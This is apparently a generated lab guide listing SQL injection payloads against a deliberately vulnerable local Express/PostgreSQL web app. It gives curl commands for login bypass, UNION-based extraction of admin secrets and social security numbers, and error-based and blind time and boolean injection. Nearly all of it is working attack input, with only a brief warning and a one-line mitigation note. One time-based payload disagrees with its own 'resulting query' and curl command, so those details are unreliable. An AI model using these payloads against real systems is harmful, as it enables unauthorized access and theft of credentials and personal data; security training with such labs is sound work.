# SQL Injection Payloads for Testing Vulnerable Webapp

**Warning**: These SQL injection payloads are for educational purposes only and must be used in a controlled, isolated testing environment (e.g., the local `webapp_security_test` database). Never use them on production systems or systems you do not own, as SQL injection is illegal and unethical without explicit permission.

This document lists SQL injection payloads targeting the vulnerable Node.js/Express backend API and React frontend described in the provided code. The backend uses string concatenation for SQL queries, making it susceptible to injection attacks. Each payload includes its purpose, effect, and testing instructions.

## Setup
- **Backend**: Ensure the Express server (`index.js`) is running on `http://localhost:3000` with the PostgreSQL database (`postgres`) populated using the provided SQL script.
- **Frontend**: Run the Vite React app on `http://localhost:3001` (as configured in `vite.config.js`).
- **Database**: The schema includes tables like `users`, `user_profiles`, `products`, `orders`, `admin_settings`, and a `user_summary` view.

## Payloads by Endpoint

### 1. Login Endpoint (`POST /api/login`)
- **Input Fields**: `username`, `password` (JSON body)
- **Vulnerable Query**: `SELECT * FROM users WHERE username = '${username}' AND password_hash = '${password}'`
- **Goal**: Bypass authentication or extract data.

#### Payload 1: Bypass Authentication (Classic OR 1=1)
- **Username**: `admin' OR '1'='1`
- **Password**: `anything`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password_hash = 'anything'`
- **Effect**: The `OR '1'='1'` makes the condition always true, potentially logging in as the first user (e.g., `admin`).
- **How to Test**:
  1. Open the frontend at `http://localhost:3001`.
  2. In the "Login" form, enter the payload in the `username` field and any value in the `password` field.
  3. Click "Login" and check the message (e.g., `Logged in as admin`).
  4. Alternatively, use `curl`:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}' http://localhost:3000/api/login
     ```
  5. Verify the response contains user data (e.g., `{"success":true,"user":{"username":"admin",...}}`).

#### Payload 2: Bypass Authentication (Comment Out Password Check)
- **Username**: `admin' -- `
- **Password**: `anything`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' -- ' AND password_hash = 'anything'`
- **Effect**: The `--` comments out the password check, allowing login without a valid password.
- **How to Test**:
  1. In the frontend login form, enter `admin' -- ` as the username and any password.
  2. Click "Login" and check for a successful login message.
  3. Use `curl`:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"username":"admin'\'' -- ","password":"anything"}' http://localhost:3000/api/login
     ```
  4. Confirm the response shows a successful login for `admin`.

#### Payload 3: Union-Based Data Extraction
- **Username**: `nonexistent' UNION SELECT 1, 'hacked', 'hacked@company.com', 'hacked_pass', 'administrator', true, CURRENT_TIMESTAMP, NULL, 0 --`
- **Password**: `anything`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'nonexistent' UNION SELECT 1, 'hacked', 'hacked@company.com', 'hacked_pass', 'administrator', true, CURRENT_TIMESTAMP, NULL, 0 -- ' AND password_hash = 'anything'`
- **Effect**: Returns a fake user with `administrator` role, potentially allowing login as a crafted user.
- **How to Test**:
  1. Enter the payload in the frontend login form’s `username` field.
  2. Submit and check the response message or use browser developer tools to inspect the API response.
  3. Use `curl`:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"username":"nonexistent'\'' UNION SELECT 1, '\''hacked'\'', '\''hacked@company.com'\'', '\''hacked_pass'\'', '\''administrator'\'', true, CURRENT_TIMESTAMP, NULL, 0 -- ","password":"anything"}' http://localhost:3000/api/login
     ```
  4. Look for a response containing the fake user data (e.g., `username: "hacked"`).

#### Payload 4: Blind SQL Injection (Time-Based)
- **Username**: `admin' OR (SELECT PG_SLEEP(5)) IS NOT NULL --`
- **Password**: `anything`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' AND (SELECT PG_SLEEP(5)) -- ' AND password_hash = 'anything'`
- **Effect**: Delays the query by 5 seconds if the condition is true, confirming the vulnerability.
- **How to Test**:
  1. Enter the payload in the frontend login form’s `username` field.
  2. Click "Login" and measure the response time (should take ~5 seconds).
  3. Use `curl` with timing:
     ```bash
     time curl -X POST -H "Content-Type: application/json" -d '{"username":"admin'\'' AND (SELECT PG_SLEEP(5)) -- ","password":"anything"}' http://localhost:3000/api/login
     ```
  4. A 5-second delay indicates a successful injection.

### 2. User Endpoint (`GET /api/users/:username`)
- **Input Field**: `username` (URL parameter)
- **Vulnerable Query**: `SELECT * FROM users WHERE username = '${username}'`
- **Goal**: Extract sensitive user data or manipulate results.

#### Payload 1: Retrieve All Users
- **Username**: `admin' OR '1'='1`
- **URL**: `http://localhost:3000/api/users/admin%27%20OR%20%271%27=%271`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
- **Effect**: Returns all rows from the `users` table, exposing usernames, emails, password hashes, and roles.
- **How to Test**:
  1. Use a browser or `curl` to send the request:
     ```bash
     curl "http://localhost:3000/api/users/admin%27%20OR%20%271%27=%271"
     ```
  2. Alternatively, use a proxy like Burp Suite to modify a frontend request (e.g., from the "User Summary" form).
  3. Check the response for multiple user records (e.g., `admin`, `john_doe`, `jane_smith`).

#### Payload 2: Union-Based Schema Extraction
- **Username**: `admin' UNION SELECT 1, table_name, 'fake_email', 'fake_pass', 'user', true, CURRENT_TIMESTAMP, NULL, 0 FROM information_schema.tables -- `
- **URL**: `http://localhost:3000/api/users/admin%27%20UNION%20SELECT%201,table_name,%27fake_email%27,%27fake_pass%27,%27user%27,true,CURRENT_TIMESTAMP,NULL,0%20FROM%20information_schema.tables%20--%20`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' UNION SELECT 1, table_name, 'fake_email', 'fake_pass', 'user', true, CURRENT_TIMESTAMP, NULL, 0 FROM information_schema.tables -- `
- **Effect**: Returns a list of table names (e.g., `users`, `user_profiles`, `admin_settings`) in the `username` field.
- **How to Test**:
  1. Send the request via `curl` or a browser.
  2. Inspect the response for table names in the `username` field.
  3. Use Burp Suite to inject the payload into a frontend request.

#### Payload 3: Extract Admin Settings
- **Username**: `admin' UNION SELECT 1, setting_key, setting_value, 'fake_pass', 'user', true, CURRENT_TIMESTAMP, NULL, 0 FROM admin_settings -- `
- **URL**: `http://localhost:3000/api/users/admin%27%20UNION%20SELECT%201,setting_key,setting_value,%27fake_pass%27,%27user%27,true,CURRENT_TIMESTAMP,NULL,0%20FROM%20admin_settings%20--%20`
- **Resulting Query**: `SELECT * FROM users WHERE username = 'admin' UNION SELECT 1, setting_key, setting_value, 'fake_pass', 'user', true, CURRENT_TIMESTAMP, NULL, 0 FROM admin_settings -- `
- **Effect**: Exposes sensitive data from `admin_settings` (e.g., `database_password`, `api_secret_key`).
- **How to Test**:
  1. Send the request via `curl` or a browser.
  2. Check the response for sensitive keys (e.g., `database_password`) and values (e.g., `super_secret_db_pass_2024!`).
  3. Use a proxy to modify a frontend request.

### 3. Products Endpoint (`GET /api/products/:category`)
- **Input Field**: `category` (URL parameter)
- **Vulnerable Query**: `SELECT * FROM products WHERE category = '${category}' AND is_published = true`
- **Goal**: Access unpublished products or extract other data.

#### Payload 1: Bypass is_published Restriction
- **Category**: `Electronics' OR '1'='1`
- **URL**: `http://localhost:3000/api/products/Electronics%27%20OR%20%271%27=%271`
- **Resulting Query**: `SELECT * FROM products WHERE category = 'Electronics' OR '1'='1' AND is_published = true`
- **Effect**: Returns all products, including the `Secret Product` (name: `Secret Product`, price: 9999.99, `is_published = false`).
- **How to Test**:
  1. In the frontend, use browser developer tools to modify the `category` dropdown value to the payload.
  2. Alternatively, send the request via `curl`:
     ```bash
     curl "http://localhost:3000/api/products/Electronics%27%20OR%20%271%27=%271"
     ```
  3. Check the response for the `Secret Product`.

#### Payload 2: Union-Based Data Extraction
- **Category**: `Electronics' UNION SELECT 1, username, email, 0, 'Users', 0, true, CURRENT_TIMESTAMP FROM users -- `
- **URL**: `http://localhost:3000/api/products/Electronics%27%20UNION%20SELECT%201,username,email,0,%27Users%27,0,true,CURRENT_TIMESTAMP%20FROM%20users%20--%20`
- **Resulting Query**: `SELECT * FROM products WHERE category = 'Electronics' UNION SELECT 1, username, email, 0, 'Users', 0, true, CURRENT_TIMESTAMP FROM users -- `
- **Effect**: Returns user data (usernames and emails) formatted as products.
- **How to Test**:
  1. Send the request via `curl` or a browser.
  2. Look for usernames (e.g., `admin`, `john_doe`) in the `name` field of the response.
  3. Use Burp Suite to inject the payload into a frontend request.

#### Payload 3: Error-Based Injection
- **Category**: `Electronics' AND (SELECT CAST((SELECT social_security_number FROM user_profiles LIMIT 1) AS INTEGER)) -- `
- **URL**: `http://localhost:3000/api/products/Electronics%27%20AND%20(SELECT%20CAST((SELECT%20social_security_number%20FROM%20user_profiles%20LIMIT%201)%20AS%20INTEGER))%20--%20`
- **Resulting Query**: `SELECT * FROM products WHERE category = 'Electronics' AND (SELECT CAST((SELECT social_security_number FROM user_profiles LIMIT 1) AS INTEGER)) -- `
- **Effect**: Causes a database error that may leak the social security number (e.g., `123-45-6789`) in the error message.
- **How to Test**:
  1. Send the request via `curl` or a browser.
  2. Check the server response or logs for an error containing `123-45-6789`.
  3. Use a proxy to modify a frontend request.

### 4. User Summary Endpoint (`GET /api/user-summary/:username`)
- **Input Field**: `username` (URL parameter)
- **Vulnerable Query**: `SELECT * FROM user_summary WHERE username = '${username}'`
- **Goal**: Extract sensitive user data or manipulate the view.

#### Payload 1: Retrieve All User Summaries
- **Username**: `admin' OR '1'='1`
- **URL**: `http://localhost:3000/api/user-summary/admin%27%20OR%20%271%27=%271`
- **Resulting Query**: `SELECT * FROM user_summary WHERE username = 'admin' OR '1'='1'`
- **Effect**: Returns all rows from the `user_summary` view, including usernames, emails, roles, balances, and order counts.
- **How to Test**:
  1. In the frontend, enter the payload in the `username` field under "User Summary" and click "Fetch User Summary."
  2. Check the displayed data for multiple user records.
  3. Use `curl`:
     ```bash
     curl "http://localhost:3000/api/user-summary/admin%27%20OR%20%271%27=%271"
     ```

#### Payload 2: Union-Based Sensitive Data Extraction
- **Username**: `admin' UNION SELECT 1, 'hacked', email, 'administrator', first_name, last_name, account_balance, 0 FROM user_profiles -- `
- **URL**: `http://localhost:3000/api/user-summary/admin%27%20UNION%20SELECT%201,%27hacked%27,email,%27administrator%27,first_name,last_name,account_balance,0%20FROM%20user_profiles%20--%20`
- **Resulting Query**: `SELECT * FROM user_summary WHERE username = 'admin' UNION SELECT 1, 'hacked', email, 'administrator', first_name, last_name, account_balance, 0 FROM user_profiles -- `
- **Effect**: Extracts sensitive data (e.g., emails, names, balances) from `user_profiles`.
- **How to Test**:
  1. Enter the payload in the frontend’s `username` field and click "Fetch User Summary."
  2. Use `curl` or a browser to send the request.
  3. Check the response for user profile data (e.g., `email: "admin@company.com"`).

#### Payload 3: Blind Boolean-Based Injection
- **Username**: `admin' AND (SELECT LENGTH(setting_value) FROM admin_settings WHERE setting_key = 'database_password') > 20 -- `
- **URL**: `http://localhost:3000/api/user-summary/admin%27%20AND%20(SELECT%20LENGTH(setting_value)%20FROM%20admin_settings%20WHERE%20setting_key%20=%20%27database_password%27)%20>%2020%20--%20`
- **Resulting Query**: `SELECT * FROM user_summary WHERE username = 'admin' AND (SELECT LENGTH(setting_value) FROM admin_settings WHERE setting_key = 'database_password') > 20 -- `
- **Effect**: Returns data if the `database_password` value is longer than 20 characters (true for `super_secret_db_pass_2024!`).
- **How to Test**:
  1. Enter the payload in the frontend and click "Fetch User Summary."
  2. If the admin’s summary is returned, the condition is true; if empty, it’s false.
  3. Use `curl` to verify.

### 5. Admin Settings Endpoint (`GET /api/admin-settings/:key`)
- **Input Field**: `key` (URL parameter)
- **Vulnerable Query**: `SELECT * FROM admin_settings WHERE setting_key = '${key}'`
- **Goal**: Extract sensitive configuration data.

#### Payload 1: Retrieve All Settings
- **Key**: `database_password' OR '1'='1`
- **URL**: `http://localhost:3000/api/admin-settings/database_password%27%20OR%20%271%27=%271`
- **Resulting Query**: `SELECT * FROM admin_settings WHERE setting_key = 'database_password' OR '1'='1'`
- **Effect**: Returns all rows from `admin_settings`, exposing sensitive data like `database_password`, `api_secret_key`, and `payment_gateway_secret`.
- **How to Test**:
  1. Send the request via `curl`:
     ```bash
     curl "http://localhost:3000/api/admin-settings/database_password%27%20OR%20%271%27=%271"
     ```
  2. Check the response for all settings (e.g., `database_password`, `api_secret_key`).
  3. Use Burp Suite to inject the payload into a frontend request.

#### Payload 2: Union-Based Data Extraction
- **Key**: `database_password' UNION SELECT 1, social_security_number, 'fake_value', false, 'Hacked', 1, CURRENT_TIMESTAMP FROM user_profiles -- `
- **URL**: `http://localhost:3000/api/admin-settings/database_password%27%20UNION%20SELECT%201,social_security_number,%27fake_value%27,false,%27Hacked%27,1,CURRENT_TIMESTAMP%20FROM%20user_profiles%20--%20`
- **Resulting Query**: `SELECT * FROM admin_settings WHERE setting_key = 'database_password' UNION SELECT 1, social_security_number, 'fake_value', false, 'Hacked', 1, CURRENT_TIMESTAMP FROM user_profiles -- `
- **Effect**: Returns social security numbers from `user_profiles` formatted as admin settings.
- **How to Test**:
  1. Send the request via `curl` or a browser.
  2. Check the response for values like `123-45-6789` in the `setting_key` field.
  3. Use a proxy to modify a frontend request.

#### Payload 3: Time-Based Blind Injection
- **Key**: `database_password' AND (SELECT PG_SLEEP(5)) -- `
- **URL**: `http://localhost:3000/api/admin-settings/database_password%27%20AND%20(SELECT%20PG_SLEEP(5))%20--%20`
- **Resulting Query**: `SELECT * FROM admin_settings WHERE setting_key = 'database_password' AND (SELECT PG_SLEEP(5)) -- `
- **Effect**: Delays the response by 5 seconds, confirming the vulnerability.
- **How to Test**:
  1. Send the request via `curl` with timing:
     ```bash
     time curl "http://localhost:3000/api/admin-settings/database_password%27%20AND%20(SELECT%20PG_SLEEP(5))%20--%20"
     ```
  2. A 5-second delay indicates success.

### 6. Order Endpoint (`POST /api/orders`)
- **Input Fields**: `user_id`, `product_id`, `quantity`, `shipping_address` (JSON body)
- **Vulnerable Queries**:
  - `SELECT price * ${quantity} AS total FROM products WHERE id = ${product_id}`
  - `INSERT INTO orders (user_id, product_id, quantity, total_amount, shipping_address) VALUES (${user_id}, ${product_id}, ${quantity}, ${total_amount}, '${shipping_address}')`
- **Goal**: Manipulate order data or extract information.

#### Payload 1: Manipulate Product ID
- **Product ID**: `1 OR 1=1`
- **JSON Body**: `{ "user_id": 2, "product_id": "1 OR 1=1", "quantity": 1, "shipping_address": "456 Oak Ave" }`
- **Resulting Query**: `SELECT price * 1 AS total FROM products WHERE id = 1 OR 1=1`
- **Effect**: May select an unintended product or cause unexpected behavior (e.g., selecting the first product).
- **How to Test**:
  1. In the frontend’s "Create Order" form, enter the payload in the `product_id` field.
  2. Fill other fields (e.g., `user_id: 2`, `quantity: 1`, `shipping_address: 456 Oak Ave`) and submit.
  3. Check the response message (e.g., `Order created: <id>`).
  4. Use `curl`:
     ```bash
     curl -X POST -H "Content-Type: application/json" -d '{"user_id":2,"product_id":"1 OR 1=1","quantity":1,"shipping_address":"456 Oak Ave"}' http://localhost:3000/api/orders
     ```

#### Payload 2: SQL Injection in Shipping Address
- **Shipping Address**: `test' OR '1'='1`
- **JSON Body**: `{ "user_id": 2, "product_id": 1, "quantity": 1, "shipping_address": "test' OR '1'='1" }`
- **Resulting Query**: `INSERT INTO orders (user_id, product_id, quantity, total_amount, shipping_address) VALUES (2, 1, 1, 1299.99, 'test' OR '1'='1')`
- **Effect**: Causes a syntax error or may allow further manipulation if combined with other payloads.
- **How to Test**:
  1. Enter the payload in the frontend’s `shipping_address` field and submit the order.
  2. Check for an error message or unexpected behavior.
  3. Use `curl` to send the request and inspect the response.

#### Payload 3: Union-Based Injection in Product ID
- **Product ID**: `1 UNION SELECT 1, 9999.99 FROM admin_settings WHERE setting_key = 'database_password' -- `
- **JSON Body**: `{ "user_id": 2, "product_id": "1 UNION SELECT 1, 9999.99 FROM admin_settings WHERE setting_key = 'database_password' -- ", "quantity": 1, "shipping_address": "456 Oak Ave" }`
- **Resulting Query**: `SELECT price * 1 AS total FROM products WHERE id = 1 UNION SELECT 1, 9999.99 FROM admin_settings WHERE setting_key = 'database_password' -- `
- **Effect**: Manipulates the `total_amount` to an arbitrary value (e.g., 9999.99).
- **How to Test**:
  1. Enter the payload in the frontend’s `product_id` field and submit the order.
  2. Check the created order’s `total_amount` in the response or database.
  3. Use `curl` to send the request and verify the order details.

## Testing Tools
- **Frontend**: Use the React app (`http://localhost:3001`) to input payloads directly in form fields or modify requests via browser developer tools (e.g., Chrome DevTools).
- **cURL**: Send HTTP requests from the command line to test API endpoints directly.
- **Burp Suite**: Intercept and modify frontend requests to inject payloads, especially for URL-based or complex injections.
- **Postman**: Test API endpoints with crafted JSON bodies or URL parameters.

## Notes
- **Expected Results**:
  - Successful injections may return unauthorized data (e.g., all users, sensitive settings) or bypass authentication.
  - Error-based injections may leak data in error messages.
  - Time-based injections cause delays (e.g., 5 seconds).
  - Blind injections confirm conditions via presence/absence of data.
- **Database Schema**: Payloads assume the provided schema and data (e.g., `admin` user, `database_password` setting).
- **Legal Reminder**: Only test on systems you own or have explicit permission to test. Unauthorized SQL injection is a cybercrime.
- **Mitigation (Not Implemented)**: Use parameterized queries, input validation, and least privilege to prevent SQL injection in production apps.

This document was generated on June 10, 2025, at 05:27 PM CDT. For further assistance, contact the system administrator or refer to the backend/frontend code.